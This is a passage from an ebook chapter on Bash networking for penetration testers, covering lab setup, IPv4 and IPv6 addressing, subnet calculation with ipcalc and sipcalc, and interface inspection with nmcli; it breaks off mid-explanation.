<html><head></head><body>
  <div id="_idContainer063">
   <h1 class="chapter-number" id="_idParaDest-110">
    <a id="_idTextAnchor148">
    </a>
    <span class="koboSpan" id="kobo.1.1">
     6
    </span>
   </h1>
   <h1 id="_idParaDest-111">
    <a id="_idTextAnchor149">
    </a>
    <span class="koboSpan" id="kobo.2.1">
     Bash Networking
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.3.1">
     In
    </span>
    <a href="B22229_05.xhtml#_idTextAnchor089">
     <span class="No-Break">
      <em class="italic">
       <span class="koboSpan" id="kobo.4.1">
        Chapter 5
       </span>
      </em>
     </span>
    </a>
    <span class="koboSpan" id="kobo.5.1">
     , you learned how to use functions to make your code more robust.
    </span>
    <span class="koboSpan" id="kobo.5.2">
     This chapter will build on previous chapters by applying what you’ve learned to real-world pentesting tasks related to networking and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.6.1">
      network exploitation.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.7.1">
     This chapter dives into the world of
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.8.1">
      Bash networking
     </span>
    </strong>
    <span class="koboSpan" id="kobo.9.1">
     .
    </span>
    <span class="koboSpan" id="kobo.9.2">
     We’ll take a tour of commands and scripts that let you configure, troubleshoot, and exploit networking in a Unix/Linux environment.
    </span>
    <span class="koboSpan" id="kobo.9.3">
     You’ll learn not just how to access network configuration details and interact with network components but also how to use Bash scripting to exploit vulnerable network services.
    </span>
    <span class="koboSpan" id="kobo.9.4">
     We’ll start with the basics, then gradually step into more advanced concepts, all the way to network
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.10.1">
      traffic analysis.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.11.1">
     By the end of this chapter, you’ll be able to identify network configuration details, understand network diagnostics in Bash, enumerate network services in Bash, automate network scanning tools and chain attack sequences, and explore exploitation and post-exploitation commands in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.12.1">
      Bash scripts.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.13.1">
     In this chapter, we’re going to cover the following
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.14.1">
      main topics:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.15.1">
      Networking basics
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.16.1">
       with Bash
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.17.1">
      Scripting network enumeration
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.18.1">
       with Bash
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.19.1">
      Bash techniques for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.20.1">
       network exploitation
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.21.1">
      Bash scripting for network
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.22.1">
       traffic analysis
      </span>
     </span>
    </li>
   </ul>
   <h1 id="_idParaDest-112">
    <a id="_idTextAnchor150">
    </a>
    <span class="koboSpan" id="kobo.23.1">
     Technical requirements
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.24.1">
     The code for this chapter can be found
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.25.1">
      at
     </span>
    </span>
    <a href="https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter06">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.26.1">
       https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter06
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.27.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.28.1">
     Following along with one of the exploitation exercises will require you to download and run
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.29.1">
      vulhub
     </span>
    </strong>
    <span class="koboSpan" id="kobo.30.1">
     (
    </span>
    <a href="https://github.com/vulhub/vulhub">
     <span class="koboSpan" id="kobo.31.1">
      https://github.com/vulhub/vulhub
     </span>
    </a>
    <span class="koboSpan" id="kobo.32.1">
     ) with the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.33.1">
      Shellshock
     </span>
    </strong>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.34.1">
      exploit configured.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.35.1">
     Install the required tools in Kali by running the following command in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.36.1">
      your terminal:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.37.1">
$ sudo apt install -y net-tools tshark ipcalc sipcalc</span></pre>
   <p>
    <span class="koboSpan" id="kobo.38.1">
     Having configured your system to follow along, let’s dive into an exploration of networking in Bash in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.39.1">
      next section.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-113">
    <a id="_idTextAnchor151">
    </a>
    <span class="koboSpan" id="kobo.40.1">
     Networking basics with Bash
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.41.1">
     Alright, let’s dive into
    </span>
    <a id="_idIndexMarker321">
    </a>
    <span class="koboSpan" id="kobo.42.1">
     understanding
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.43.1">
      Internet Protocol
     </span>
    </strong>
    <span class="koboSpan" id="kobo.44.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.45.1">
      IP
     </span>
    </strong>
    <span class="koboSpan" id="kobo.46.1">
     ) addresses
    </span>
    <a id="_idIndexMarker322">
    </a>
    <span class="koboSpan" id="kobo.47.1">
     and
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.48.1">
      subnets
     </span>
    </strong>
    <span class="koboSpan" id="kobo.49.1">
     .
    </span>
    <span class="koboSpan" id="kobo.49.2">
     There are two
    </span>
    <a id="_idIndexMarker323">
    </a>
    <span class="koboSpan" id="kobo.50.1">
     types of IP addresses:
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.51.1">
      IP Version 4
     </span>
    </strong>
    <span class="koboSpan" id="kobo.52.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.53.1">
      IPv4
     </span>
    </strong>
    <span class="koboSpan" id="kobo.54.1">
     ) and
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.55.1">
      IPv6
     </span>
    </strong>
    <span class="koboSpan" id="kobo.56.1">
     .
    </span>
    <span class="koboSpan" id="kobo.56.2">
     You’ll usually be working with IPv4 addresses, but it helps
    </span>
    <a id="_idIndexMarker324">
    </a>
    <span class="koboSpan" id="kobo.57.1">
     to know the basics
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.58.1">
      of both.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.59.1">
     IP addresses are like street
    </span>
    <a id="_idIndexMarker325">
    </a>
    <span class="koboSpan" id="kobo.60.1">
     addresses.
    </span>
    <span class="koboSpan" id="kobo.60.2">
     They help devices communicate with each other over a network.
    </span>
    <span class="koboSpan" id="kobo.60.3">
     An IP address is a unique number assigned to each device connected to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.61.1">
      a netw
     </span>
     <a id="_idTextAnchor152">
     </a>
     <a id="_idTextAnchor153">
     </a>
     <span class="koboSpan" id="kobo.62.1">
      ork.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-114">
    <a id="_idTextAnchor154">
    </a>
    <span class="koboSpan" id="kobo.63.1">
     Understanding IP addresses and subnets (IPv4)
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.64.1">
     IPv4 is the fourth version
    </span>
    <a id="_idIndexMarker326">
    </a>
    <span class="koboSpan" id="kobo.65.1">
     of the IP.
    </span>
    <span class="koboSpan" id="kobo.65.2">
     It is the most widely used version of the IP in the world today.
    </span>
    <span class="koboSpan" id="kobo.65.3">
     IPv4 addresses are 32-bit numerical values
    </span>
    <a id="_idIndexMarker327">
    </a>
    <span class="koboSpan" id="kobo.66.1">
     expressed in four
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.67.1">
      octets
     </span>
    </strong>
    <span class="koboSpan" id="kobo.68.1">
     separated by periods.
    </span>
    <span class="koboSpan" id="kobo.68.2">
     Each octet can range from
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.69.1">
      0
     </span>
    </strong>
    <span class="koboSpan" id="kobo.70.1">
     to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.71.1">
      255
     </span>
    </strong>
    <span class="koboSpan" id="kobo.72.1">
     , making up a total of over four billion
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.73.1">
      unique addresses.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.74.1">
     An IPv4 address consists of four sections separated by periods.
    </span>
    <span class="koboSpan" id="kobo.74.2">
     Here is an example of an IPv4 address:
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.75.1">
      192.168.1.1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.76.1">
     .
    </span>
    <span class="koboSpan" id="kobo.76.2">
     Let’s break it down
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.77.1">
      for you:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.78.1">
      There are four sections, each separated by
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.79.1">
       a period.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.80.1">
      Each section is referred to as
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.81.1">
       an octet.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.82.1">
       192
      </span>
     </strong>
     <span class="koboSpan" id="kobo.83.1">
      represents the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.84.1">
       first octet.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.85.1">
       168
      </span>
     </strong>
     <span class="koboSpan" id="kobo.86.1">
      represents the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.87.1">
       second octet.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.88.1">
       1
      </span>
     </strong>
     <span class="koboSpan" id="kobo.89.1">
      represents the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.90.1">
       third octet.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.91.1">
       1
      </span>
     </strong>
     <span class="koboSpan" id="kobo.92.1">
      represents the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.93.1">
       fourth octet.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.94.1">
     Each octet in an IPv4 address can have a value between
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.95.1">
      0
     </span>
    </strong>
    <span class="koboSpan" id="kobo.96.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.97.1">
      255
     </span>
    </strong>
    <span class="koboSpan" id="kobo.98.1">
     , making it a 32-bit
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.99.1">
      address space.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.100.1">
     The command to review your IP address in Bash is
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.101.1">
      ip address
     </span>
    </strong>
    <span class="koboSpan" id="kobo.102.1">
     , which can be abbreviated to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.103.1">
      ip a
     </span>
    </strong>
    <span class="koboSpan" id="kobo.104.1">
     .
    </span>
    <span class="koboSpan" id="kobo.104.2">
     You may encounter the deprecated
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.105.1">
      ifconfig
     </span>
    </strong>
    <span class="koboSpan" id="kobo.106.1">
     command on older Linux systems, which
    </span>
    <a id="_idIndexMarker328">
    </a>
    <span class="koboSpan" id="kobo.107.1">
     performs the same function.
    </span>
    <span class="koboSpan" id="kobo.107.2">
     Let’s see
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.108.1">
      an example:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer049">
     <span class="koboSpan" id="kobo.109.1">
      <img alt="Figure 6.1 – An example command to get the IP address information" src="image/B22229_06_01.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.110.1">
     Figure 6.1 – An example command to get the IP address information
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.111.1">
     The preceding command output shows two network interfaces,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.112.1">
      lo
     </span>
    </strong>
    <span class="koboSpan" id="kobo.113.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.114.1">
      eth0
     </span>
    </strong>
    <span class="koboSpan" id="kobo.115.1">
     .
    </span>
    <span class="koboSpan" id="kobo.115.2">
     You may see different interface names on your system, and you may have more than
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.116.1">
      two interfaces.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.117.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.118.1">
      lo
     </span>
    </strong>
    <span class="koboSpan" id="kobo.119.1">
     interface, also known as the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.120.1">
      loopback adapter
     </span>
    </strong>
    <span class="koboSpan" id="kobo.121.1">
     , is a network component that allows a computer to send and
    </span>
    <a id="_idIndexMarker329">
    </a>
    <span class="koboSpan" id="kobo.122.1">
     receive data packets to itself, simulating a real network connection.
    </span>
    <span class="koboSpan" id="kobo.122.2">
     Assigned the IP address
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.123.1">
      127.0.0.1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.124.1">
     , commonly referred to as
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.125.1">
      localhost
     </span>
    </strong>
    <span class="koboSpan" id="kobo.126.1">
     , it enables
    </span>
    <a id="_idIndexMarker330">
    </a>
    <span class="koboSpan" id="kobo.127.1">
     software applications to test internal network communications without external network involvement, which is essential for debugging and development.
    </span>
    <span class="koboSpan" id="kobo.127.2">
     Additionally, it enhances security by allowing services to bind to this address, ensuring they are only accessible locally, thus protecting them from external threats and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.128.1">
      unauthorized access.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.129.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.130.1">
      eth0
     </span>
    </strong>
    <span class="koboSpan" id="kobo.131.1">
     interface has the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.132.1">
      192.168.61.128
     </span>
    </strong>
    <span class="koboSpan" id="kobo.133.1">
     IPv4 address assigned.
    </span>
    <span class="koboSpan" id="kobo.133.2">
     This is the network interface that my system uses to communicate on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.134.1">
      the network.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.135.1">
     After the IP address, you can see a forward slash (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.136.1">
      /
     </span>
    </strong>
    <span class="koboSpan" id="kobo.137.1">
     ) and a number.
    </span>
    <span class="koboSpan" id="kobo.137.2">
     This is the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.138.1">
      subnet mask
     </span>
    </strong>
    <span class="koboSpan" id="kobo.139.1">
     , sometimes
    </span>
    <a id="_idIndexMarker331">
    </a>
    <span class="koboSpan" id="kobo.140.1">
     referred to as the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.141.1">
      netmask
     </span>
    </strong>
    <span class="koboSpan" id="kobo.142.1">
     .
    </span>
    <span class="koboSpan" id="kobo.142.2">
     The subnet mask identifies the network address.
    </span>
    <span class="koboSpan" id="kobo.142.3">
     To understand
    </span>
    <a id="_idIndexMarker332">
    </a>
    <span class="koboSpan" id="kobo.143.1">
     this better, we use
    </span>
    <a id="_idIndexMarker333">
    </a>
    <span class="koboSpan" id="kobo.144.1">
     a process called bitwise
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.145.1">
      ANDing
     </span>
    </strong>
    <span class="koboSpan" id="kobo.146.1">
     .
    </span>
    <span class="koboSpan" id="kobo.146.2">
     We convert the IP address and subnet mask into binary and then perform
    </span>
    <a id="_idIndexMarker334">
    </a>
    <span class="koboSpan" id="kobo.147.1">
     a bitwise
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.148.1">
      AND
     </span>
    </strong>
    <span class="koboSpan" id="kobo.149.1">
     operation.
    </span>
    <span class="koboSpan" id="kobo.149.2">
     The bitwise
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.150.1">
      AND
     </span>
    </strong>
    <span class="koboSpan" id="kobo.151.1">
     operation results in a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.152.1">
      1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.153.1">
     value only if both binary bits are
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.154.1">
      1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.155.1">
     ; otherwise, it results in
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.156.1">
       0
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.157.1">
      (zero).
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.158.1">
     Let’s use the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.159.1">
      ipcalc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.160.1">
     program to visualize this
    </span>
    <a id="_idIndexMarker335">
    </a>
    <span class="koboSpan" id="kobo.161.1">
     information.
    </span>
    <span class="koboSpan" id="kobo.161.2">
     You can install it by running the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.162.1">
      sudo apt install -y ipcalc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.163.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.163.2">
     Let’s see
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.164.1">
      an example:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer050">
     <span class="koboSpan" id="kobo.165.1">
      <img alt="Figure 6.2 – An example of the ipcalc command" src="image/B22229_06_02.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.166.1">
     Figure 6.2 – An example of the ipcalc command
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.167.1">
     In the preceding figure, we’ve passed the IP address and netmask as an argument to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.168.1">
      ipcalc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.169.1">
     program.
    </span>
    <span class="koboSpan" id="kobo.169.2">
     First, take
    </span>
    <a id="_idIndexMarker336">
    </a>
    <span class="koboSpan" id="kobo.170.1">
     a look at the structure of these addresses in binary.
    </span>
    <span class="koboSpan" id="kobo.170.2">
     If each part is eight binary bits and there are four parts, then you have a total of 32 bits in an
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.171.1">
      IPv4 address.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.172.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.173.1">
      /24
     </span>
    </strong>
    <span class="koboSpan" id="kobo.174.1">
     subnet mask means that the network address is 24 bits.
    </span>
    <span class="koboSpan" id="kobo.174.2">
     Look at the line that starts with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.175.1">
      Netmask
     </span>
    </strong>
    <span class="koboSpan" id="kobo.176.1">
     in the preceding figure.
    </span>
    <span class="koboSpan" id="kobo.176.2">
     It shows that the network address is 24 bits, leaving eight bits for host addresses on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.177.1">
      this network.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.178.1">
     IP addresses representing the network address and broadcast address cannot be assigned to hosts.
    </span>
    <span class="koboSpan" id="kobo.178.2">
     This means that on a network with a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.179.1">
      /24
     </span>
    </strong>
    <span class="koboSpan" id="kobo.180.1">
     or
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.181.1">
      255.255.255.0
     </span>
    </strong>
    <span class="koboSpan" id="kobo.182.1">
     subnet mask, the network address is
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.183.1">
      192.168.61.0
     </span>
    </strong>
    <span class="koboSpan" id="kobo.184.1">
     , the first useable host address is the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.185.1">
      HostMin
     </span>
    </strong>
    <span class="koboSpan" id="kobo.186.1">
     value and the last useable host address is the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.187.1">
       HostMax
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.188.1">
      value.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.189.1">
     Usually, a network device called a
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.190.1">
      router
     </span>
    </strong>
    <span class="koboSpan" id="kobo.191.1">
     takes the first
    </span>
    <a id="_idIndexMarker337">
    </a>
    <span class="koboSpan" id="kobo.192.1">
     useable IP address on a network.
    </span>
    <span class="koboSpan" id="kobo.192.2">
     That would be
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.193.1">
      192.168.61.1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.194.1">
     in this case.
    </span>
    <span class="koboSpan" id="kobo.194.2">
     The last address,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.195.1">
      192.168.61.255
     </span>
    </strong>
    <span class="koboSpan" id="kobo.196.1">
     , is a
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.197.1">
      broadcast address
     </span>
    </strong>
    <span class="koboSpan" id="kobo.198.1">
     .
    </span>
    <span class="koboSpan" id="kobo.198.2">
     A
    </span>
    <a id="_idIndexMarker338">
    </a>
    <span class="koboSpan" id="kobo.199.1">
     broadcast address is the address that is used when a host needs to send to all IP addresses on the network.
    </span>
    <span class="koboSpan" id="kobo.199.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.200.1">
      NetMin
     </span>
    </strong>
    <span class="koboSpan" id="kobo.201.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.202.1">
      NetMax
     </span>
    </strong>
    <span class="koboSpan" id="kobo.203.1">
     values fit between the network and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.204.1">
      broadcast addresses.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.205.1">
     There is much more involved in networking and network addresses, and many large books have been written on this subject.
    </span>
    <span class="koboSpan" id="kobo.205.2">
     For our purposes, we’re going to keep it simple and related to the theme of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.206.1">
      this book.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-115">
    <a id="_idTextAnchor155">
    </a>
    <span class="koboSpan" id="kobo.207.1">
     Understanding IP addresses and subnets (IPv6)
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.208.1">
     IPv6, the latest version of the IP, was developed to address the exhaustion of IPv4 addresses by using a 128-bit address space, compared to the 32-bit space used in IPv4.
    </span>
    <span class="koboSpan" id="kobo.208.2">
     This exponential increase in address space allows for a virtually limitless number of unique IP addresses, accommodating the growing number of devices connected to the internet.
    </span>
    <span class="koboSpan" id="kobo.208.3">
     Each IPv6 address is
    </span>
    <a id="_idIndexMarker339">
    </a>
    <span class="koboSpan" id="kobo.209.1">
     composed of eight groups of four hexadecimal digits, separated by colons, which can represent a vast range of IP addresses, making it ideal for the expansive needs of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.210.1">
      modern networks.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.211.1">
     In the following figure, the IPv6 address
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.212.1">
      is highlighted.
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer051">
     <span class="koboSpan" id="kobo.213.1">
      <img alt="Figure 6.3 – The ip command for IPv6" src="image/B22229_06_03.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.214.1">
     Figure 6.3 – The ip command for IPv6
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.215.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.216.1">
      ipcalc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.217.1">
     program can also
    </span>
    <a id="_idIndexMarker340">
    </a>
    <span class="koboSpan" id="kobo.218.1">
     work with IPv6 addresses; however,
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.219.1">
      Sipcalc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.220.1">
     has more features and displays more information about IPv6 by default.
    </span>
    <span class="koboSpan" id="kobo.220.2">
     Sipcalc can be installed by entering the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.221.1">
      sudo apt install -y sipcalc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.222.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.222.2">
     The following figure shows how to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.223.1">
      use
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.224.1">
       sipcalc
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.225.1">
      :
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer052">
     <span class="koboSpan" id="kobo.226.1">
      <img alt="Figure 6.4 – The use of the sipcalc utility" src="image/B22229_06_04.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.227.1">
     Figure 6.4 – The use of the sipcalc utility
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.228.1">
     In the interest of staying
    </span>
    <a id="_idIndexMarker341">
    </a>
    <span class="koboSpan" id="kobo.229.1">
     on subject, this is as far as we’re going to go into IPv6 addresses.
    </span>
    <span class="koboSpan" id="kobo.229.2">
     However, we will be reviewing common IPv6 attacks a little later in
    </span>
    <a href="B22229_10.xhtml#_idTextAnchor260">
     <span class="No-Break">
      <em class="italic">
       <span class="koboSpan" id="kobo.230.1">
        Chapter 10
       </span>
      </em>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.231.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.232.1">
     Our network interface can get an address from a
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.233.1">
      Dynamic Host Configuration Protocol
     </span>
    </strong>
    <span class="koboSpan" id="kobo.234.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.235.1">
      DHCP
     </span>
    </strong>
    <span class="koboSpan" id="kobo.236.1">
     ) server, or it can
    </span>
    <a id="_idIndexMarker342">
    </a>
    <span class="koboSpan" id="kobo.237.1">
     have a static address.
    </span>
    <span class="koboSpan" id="kobo.237.2">
     To determine how our network interface was configured, enter the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.238.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.239.1">
$ nmcli device show eth0</span></pre>
   <p>
    <span class="koboSpan" id="kobo.240.1">
     Here’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.241.1">
      an explanation:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.242.1">
       nmcli
      </span>
     </strong>
     <span class="koboSpan" id="kobo.243.1">
      : Command-line tool for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.244.1">
       controlling NetworkManager
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.245.1">
       device
      </span>
     </strong>
     <span class="koboSpan" id="kobo.246.1">
      : A subcommand of
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.247.1">
       nmcli
      </span>
     </strong>
     <span class="koboSpan" id="kobo.248.1">
      that lets you show and manage
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.249.1">
       network interfaces
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.250.1">
       show
      </span>
     </strong>
     <span class="koboSpan" id="kobo.251.1">
      : Show detailed information
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.252.1">
       about devices
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.253.1">
       eth0
      </span>
     </strong>
     <span class="koboSpan" id="kobo.254.1">
      : Without an argument, all devices are examined; to get information for a specific device, the interface name has to
     </span>
     <span class="No-Break">
